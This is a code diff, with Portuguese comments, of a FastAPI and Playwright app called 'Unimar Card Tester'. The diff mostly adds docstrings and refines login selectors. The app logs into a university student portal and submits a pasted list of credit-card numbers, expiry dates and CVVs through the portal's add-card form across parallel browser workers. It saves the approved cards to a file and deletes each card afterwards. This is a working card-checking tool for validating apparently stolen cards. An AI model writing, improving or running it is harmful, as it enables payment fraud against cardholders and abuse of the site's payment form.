@@ -14,7 +14,7 @@ from pydantic import BaseModel, field_validator
 from playwright.async_api import async_playwright
 import uvicorn
 
-# ================= CONFIG =================
+# ================= CONFIGURAÇÕES GLOBAIS =================
 PORT = int(os.getenv("PORT", "8000"))
 URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login/app")
 URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
@@ -37,7 +37,7 @@ BROWSER_ARGS = [
 SESSAO_PATH = Path("sessao_unimar.json")
 SESSAO_MAX_AGE = 86400
 
-# ================= LOGGING =================
+# ================= CONFIGURAÇÃO DE LOGS =================
 logging.basicConfig(
     level=logging.INFO,
     format="[%(asctime)s] %(levelname)s %(message)s",
@@ -45,8 +45,12 @@ logging.basicConfig(
 )
 logger = logging.getLogger("unimar")
 
-# ================= PLAYWRIGHT =================
+# ================= VERIFICAÇÃO DO PLAYWRIGHT =================
 def garantir_playwright() -> bool:
+    """
+    Verifica se os binários do Chromium do Playwright estão instalados no ambiente.
+    Caso contrário, tenta realizar a instalação via subprocesso.
+    """
     ms_playwright = Path("/root/.cache/ms-playwright")
     if ms_playwright.exists():
         for pasta in ms_playwright.iterdir():
@@ -63,8 +67,9 @@ def garantir_playwright() -> bool:
         logger.exception("Erro ao instalar Chromium")
         return False
 
-# ================= ESTADO =================
+# ================= GERENCIAMENTO DE ESTADO =================
 class Estado:
+    """Controla o estado global compartilhado da aplicação de forma thread-safe."""
     def __init__(self):
         self.lock = asyncio.Lock()
         self.rodando = False
@@ -79,13 +84,15 @@ class Estado:
 
 estado = Estado()
 
-# ================= HELPERS =================
+# ================= FUNÇÕES AUXILIARES DE ESTADO E MÉTRICAS =================
 async def set_estado(**kwargs) -> None:
+    """Atualiza variáveis de estado de forma assíncrona e protegida por lock."""
     async with estado.lock:
         for k, v in kwargs.items():
             setattr(estado, k, v)
 
 async def inc_estado(campo: str, valor: int = 1) -> int:
+    """Incrementa um contador numérico no estado global de forma segura."""
     async with estado.lock:
         atual = getattr(estado, campo)
         novo = atual + valor
@@ -93,6 +100,7 @@ async def inc_estado(campo: str, valor: int = 1) -> int:
         return novo
 
 async def calc_velocidade() -> tuple[float, int]:
+    """Calcula a velocidade de processamento (cartões por minuto) e o tempo decorrido."""
     async with estado.lock:
         inicio = estado.inicio_timestamp
         concluidas = estado.tarefas_concluidas
@@ -101,6 +109,7 @@ async def calc_velocidade() -> tuple[float, int]:
         return round(velocidade, 1), round(elapsed)
 
 async def broadcast(app: FastAPI, tipo: str, data: dict | None = None) -> None:
+    """Envia mensagens em tempo real via WebSocket para todos os clientes conectados."""
     if data is None:
         data = {}
     mensagem = {"type": tipo, **data}
@@ -118,6 +127,7 @@ async def broadcast(app: FastAPI, tipo: str, data: dict | None = None) -> None:
     logger.info("Broadcast %s enviado para %d cliente(s)", tipo, len(clients) - len(mortos))
 
 def _log_task_exception(task: asyncio.Task) -> None:
+    """Callback para capturar exceções silenciosas em tarefas de log em segundo plano."""
     if task.cancelled():
         return
     exc = task.exception()
@@ -125,6 +135,7 @@ def _log_task_exception(task: asyncio.Task) -> None:
         logger.error("Erro no broadcast de log: %s", exc)
 
 def log(app: FastAPI, msg: str) -> None:
+    """Registra logs localmente e transmite via WebSocket para o painel."""
     timestamp = time.strftime("%H:%M:%S")
     full = f"[{timestamp}] {msg}"
     logger.info(msg)
@@ -135,7 +146,7 @@ def log(app: FastAPI, msg: str) -> None:
     except RuntimeError:
         pass
 
-# ================= SCHEMAS =================
+# ================= SCHEMAS DE VALIDAÇÃO (PYDANTIC) =================
 class IniciarRequest(BaseModel):
     lista: str
     canais: int = 4
@@ -143,13 +154,14 @@ class IniciarRequest(BaseModel):
     @field_validator("canais")
     @classmethod
     def validar_canais(cls, v):
+        """Valida se o número de canais solicitados está dentro dos limites permitidos."""
         if v < 1 or v > MAX_CANAIS:
             raise ValueError(f"Canais deve ser entre 1 e {MAX_CANAIS}")
         return v
 
-# ================= WEBSOCKET KEEPALIVE =================
+# ================= KEEPALIVE WEBSOCKET =================
 async def _ws_keepalive():
-    """Envia ping a cada 30s para manter conexões WebSocket vivas."""
+    """Envia um ping periódico a cada 30 segundos para manter as conexões WebSocket ativas."""
     while True:
         await asyncio.sleep(30)
         async with estado.lock:
@@ -161,9 +173,10 @@ async def _ws_keepalive():
                 async with estado.lock:
                     estado.clients.discard(client)
 
-# ================= FASTAPI =================
+# ================= CICLO DE VIDA DO APLICATIVO (LIFESPAN) =================
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    """Gerencia a inicialização e o encerramento seguro do FastAPI, Playwright e tarefas em background."""
     app.state.playwright_ok = await asyncio.to_thread(garantir_playwright)
     app.state.job_task = None
     app.state.browser = None
@@ -185,11 +198,9 @@ async def lifespan(app: FastAPI):
 
 app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
 
-# ================= PLAYWRIGHT FLOWS =================
+# ================= FLUXOS DO PLAYWRIGHT =================
 async def sessao_valida(context) -> bool:
-    # ✅ CORRIGIDO: valida a sessão dentro de um contexto já existente,
-    # eliminando o boot de um navegador extra. Espere o botão
-    # explicitamente em vez de sleep fixo (evita falso negativo).
+    """Valida se o arquivo de sessão salvo ainda é válido abrindo a página de cartões."""
     if not SESSAO_PATH.exists():
         return False
     if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
@@ -211,12 +222,11 @@ async def sessao_valida(context) -> bool:
         return False
 
 async def limpar_cartoes(page, app: FastAPI) -> None:
+    """Remove cartões salvos anteriormente na conta para liberar espaço e evitar conflitos."""
     try:
         log(app, "[Faxina] Iniciando limpeza...")
-        # ✅ CORRIGIDO: só navega se já não estiver na página
         if URL_MEUS_CARTOES not in page.url:
             await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
-        # Espera os primeiros botões "Remover", se houver cartões
         try:
             await page.get_by_role("button", name="Remover").first \
                 .wait_for(state="visible", timeout=5000)
@@ -232,7 +242,6 @@ async def limpar_cartoes(page, app: FastAPI) -> None:
                 break
             try:
                 await botoes.first.click(force=True, timeout=5000)
-                # ✅ CORRIGIDO: espera a contagem diminuir em vez de sleep fixo
                 await page.wait_for_function(
                     """(antes) => document.querySelectorAll(
                         '[role="button"], button'
@@ -248,8 +257,7 @@ async def limpar_cartoes(page, app: FastAPI) -> None:
         logger.exception("[Faxina] Erro")
 
 async def login_mestre(playwright, app: FastAPI, browser) -> bool:
-    # ✅ CORRIGIDO: recebe o browser já aberto (compartilhado com os workers),
-    # evitando lançar navegadores extras.
+    """Realiza o processo de autenticação na plataforma da Unimar, utilizando seletores precisos para login e senha."""
     try:
         if not EMAIL or not SENHA:
             log(app, "[ERRO] Email/senha não configurados!")
@@ -260,7 +268,6 @@ async def login_mestre(playwright, app: FastAPI, browser) -> bool:
         page.on("dialog", lambda d: asyncio.create_task(d.accept()))
 
         try:
-            # ✅ CORRIGIDO: primeiro tenta reutilizar a sessão salva no MESMO browser
             if SESSAO_PATH.exists():
                 await context.close()
                 context = await browser.new_context(
@@ -277,19 +284,14 @@ async def login_mestre(playwright, app: FastAPI, browser) -> bool:
                 log(app, "[Auth] Sessão expirada, fazendo login completo...")
 
             log(app, "[Auth] Login completo (Modo Full)...")
-
-            # ✅ CORRIGIDO: domcontentloaded em vez de networkidle
             await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
 
-            # ✅ CORRIGIDO: espera condicionada ao elemento em vez de
-            # loop de polling com sleep(1)
+            # Localização precisa do campo de e-mail/login
             email_input = None
+            alvo_page = page
             for frame in [page] + list(page.frames):
                 try:
-                    el = frame.locator(
-                        "input[type='login'], input[name*='login'], "
-                        "input[type='text']"
-                    ).first
+                    el = frame.locator("input#login, input[name='login'], input[autocomplete='username']").first
                     await el.wait_for(state="visible", timeout=15000)
                     email_input = el
                     alvo_page = frame
@@ -298,15 +300,17 @@ async def login_mestre(playwright, app: FastAPI, browser) -> bool:
                     continue
 
             if not email_input:
-                log(app, "[ERRO] Campo de e-mail não encontrado.")
+                log(app, "[ERRO] Campo de e-mail/login não encontrado.")
                 await context.close()
                 return False
 
-            # ✅ CORRIGIDO: fill() instantâneo em vez de type() com delay
+            await email_input.fill("")
             await email_input.fill(EMAIL)
 
-            senha_input = alvo_page.locator("input[type='passwd']").first
+            # Localização precisa do campo de senha
+            senha_input = alvo_page.locator("input#passwd, input[name='passwd'], input[autocomplete='current-password']").first
             await senha_input.wait_for(state="visible", timeout=10000)
+            await senha_input.fill("")
             await senha_input.fill(SENHA)
 
             btn = alvo_page.locator(
@@ -315,13 +319,11 @@ async def login_mestre(playwright, app: FastAPI, browser) -> bool:
             ).first
             await btn.click()
 
-            # ✅ CORRIGIDO: espera a URL mudar (evento), não sleep fixo
             try:
                 await page.wait_for_url("**/areadoaluno/**", timeout=30000)
             except Exception:
                 await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
 
-            # Salva a sessão ANTES da faxina (garante sessão mesmo se faxina demorar)
             await context.storage_state(path=str(SESSAO_PATH))
             await limpar_cartoes(page, app)
             await context.close()
@@ -334,8 +336,9 @@ async def login_mestre(playwright, app: FastAPI, browser) -> bool:
         logger.exception("[ERRO] Login falhou")
         return False
 
-# ================= VALIDAÇÃO =================
+# ================= VALIDAÇÕES DE CARTÃO =================
 def validar_luhn(numero: str) -> bool:
+    """Implementa o algoritmo de Luhn para verificar a validade matemática do número do cartão."""
     digits = [int(d) for d in numero if d.isdigit()]
     if len(digits) < 13 or len(digits) > 19:
         return False
@@ -349,6 +352,7 @@ def validar_luhn(numero: str) -> bool:
     return checksum % 10 == 0
 
 def validar_cartao(numero: str, mes: str, ano: str, cvv: str) -> str | None:
+    """Valida estruturalmente os dados de um cartão de crédito antes de tentar o envio."""
     if not numero.isdigit() or not validar_luhn(numero):
         return "Número inválido (Luhn)"
     if not mes.isdigit() or not (1 <= int(mes) <= 12):
@@ -366,10 +370,9 @@ _ERRO_KEYWORDS = [
 ]
 
 async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
+    """Preenche o formulário web com os dados do cartão e submete para teste."""
     _TIMEOUT = 15000
     try:
-        # ✅ CORRIGIDO: só navega se não estiver na página. Grande economia
-        # por cartão, já que o worker permanece na mesma página entre cartões.
         if URL_MEUS_CARTOES not in page.url:
             await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
 
@@ -393,7 +396,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
             pass
         await btn_adicionar.click(force=True, timeout=_TIMEOUT)
 
-        # ✅ CORRIGIDO: espera o formulário aparecer em vez de sleep(0.8)
         num_input = page.locator(
             "input[name*='card'], input[id*='card'], "
             "input[placeholder*='Número'], input[aria-label*='Número']"
@@ -407,7 +409,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
             except Exception:
                 return "erro:campos_numero_nome"
 
-        # ✅ CORRIGIDO: fill() instantâneo em vez de type() com delay=30
         try:
             await num_input.fill("")
             await num_input.fill(numero)
@@ -480,8 +481,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         except Exception:
             return "erro:botao_registrar"
 
-        # ✅ CORRIGIDO: em vez de sleep(2.0) fixo, espera ATIVAMENTE algum
-        # resultado — novo botão "Remover" (aprovado) OU mensagem de erro.
         resultado = await _aguardar_resultado(page, botoes_antes, timeout=12000)
         if resultado is not None:
             return resultado
@@ -492,8 +491,7 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         return f"erro:{type(exc).__name__}"
 
 async def _aguardar_resultado(page, botoes_antes: int, timeout: int) -> str | None:
-    """Espera polling ativo até que haja resultado (sucesso ou erro),
-    retornando assim que possível em vez de esperar tempo fixo."""
+    """Aguarda ativamente por alterações na página (como surgimento de botão 'Remover' ou alertas de erro)."""
     deadline = time.time() + timeout / 1000
     while time.time() < deadline:
         if estado.cancelado:
@@ -515,10 +513,11 @@ async def _aguardar_resultado(page, botoes_antes: int, timeout: int) -> str | No
         except Exception:
             pass
 
-        await asyncio.sleep(0.15)  # polling leve (150ms), não bloqueante
+        await asyncio.sleep(0.15)
     return None
 
 async def _criar_contexto_worker(browser):
+    """Cria um novo contexto isolado do navegador para um worker específico."""
     context = await browser.new_context(
         storage_state=str(SESSAO_PATH),
         viewport=VIEWPORT,
@@ -526,18 +525,17 @@ async def _criar_contexto_worker(browser):
     )
     page = await context.new_page()
     page.on("dialog", lambda d: asyncio.create_task(d.accept()))
-    # Pré-carrega a página uma única vez por contexto; processar_cartao
-    # não precisará recarregar a cada cartão
     await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
     return context, page
 
+# ================= WORKER CONCORRENTE =================
 async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> None:
+    """Worker assíncrono individual que consome cartões da fila e executa os testes na interface."""
     await inc_estado("canais_ativos", 1)
     await broadcast(app, "status", {"canais_ativos": estado.canais_ativos})
     context = None
     page = None
     try:
-        # ✅ CORRIGIDO: escalonamento reduzido (era 1.2s por canal, até 7.2s)
         await asyncio.sleep((id_worker - 1) * 0.3)
         log(app, f"[Canal {id_worker}] Iniciando")
         context, page = await _criar_contexto_worker(browser)
@@ -641,10 +639,12 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
         log(app, f"[Canal {id_worker}] Finalizado")
 
 def _escrever_aprovado(linha: str) -> None:
+    """Salva os cartões aprovados em um arquivo de texto local."""
     with open("aprovados.txt", "a", encoding="utf-8") as f:
         f.write(f"{linha}\n")
 
 async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: FastAPI) -> None:
+    """Coordena a execução geral: inicializa a fila, lança o navegador, autentica e distribui as tarefas para os workers."""
     try:
         if not NOME_FIXO:
             log(app, "[ERRO] UNIMAR_NOME não configurado!")
@@ -671,7 +671,6 @@ async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: Fast
             await fila.put((idx, linha, 1))
 
         async with async_playwright() as pw:
-            # ✅ CORRIGIDO: UM ÚNICO browser compartilhado entre login e workers
             browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
             app.state.browser = browser
             try:
@@ -706,9 +705,10 @@ async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: Fast
         log(app, "[Sistema] Processamento concluído!")
         await broadcast(app, "status", {"rodando": False, "canais_ativos": 0})
 
-# ================= ROTAS =================
+# ================= ROTAS DA API FASTAPI =================
 @app.post("/api/iniciar")
 async def iniciar(data: IniciarRequest):
+    """Inicia o processo de validação de cartões em segundo plano."""
     if estado.rodando:
         return {"status": "já_em_execucao"}
     await set_estado(rodando=True, cancelado=False)
@@ -718,6 +718,7 @@ async def iniciar(data: IniciarRequest):
 
 @app.post("/api/parar")
 async def parar():
+    """Interrompe o processamento em andamento."""
     await set_estado(rodando=False, cancelado=True)
     log(app, "⛔ Interrupção solicitada")
     await broadcast(app, "status", {"rodando": False})
@@ -725,6 +726,7 @@ async def parar():
 
 @app.get("/api/status")
 async def status():
+    """Retorna o status atual e as métricas do processamento."""
     velocidade, elapsed = await calc_velocidade()
     return {
         "rodando": estado.rodando,
@@ -738,10 +740,12 @@ async def status():
 
 @app.get("/api/health")
 async def health():
+    """Endpoint básico para verificação de saúde da aplicação."""
     return {"status": "ok"}
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
+    """Gerencia conexões WebSocket para comunicação em tempo real com o frontend."""
     await websocket.accept()
     async with estado.lock:
         estado.clients.add(websocket)
@@ -761,6 +765,7 @@ _cached_template: str | None = None
 
 @app.get("/", response_class=HTMLResponse)
 async def index():
+    """Serve a interface HTML principal do painel."""
     global _cached_template
     if _cached_template is None:
         template_path = Path("templates/index.html")
@@ -774,7 +779,7 @@ async def index():
         )
     return HTMLResponse(content=_cached_template)
 
-# ================= MAIN =================
+# ================= EXECUÇÃO PRINCIPAL =================
 if __name__ == "__main__":
     print("=" * 50)
     print(f"🚀 Unimar Card Tester iniciando em 0.0.0.0:{PORT}")
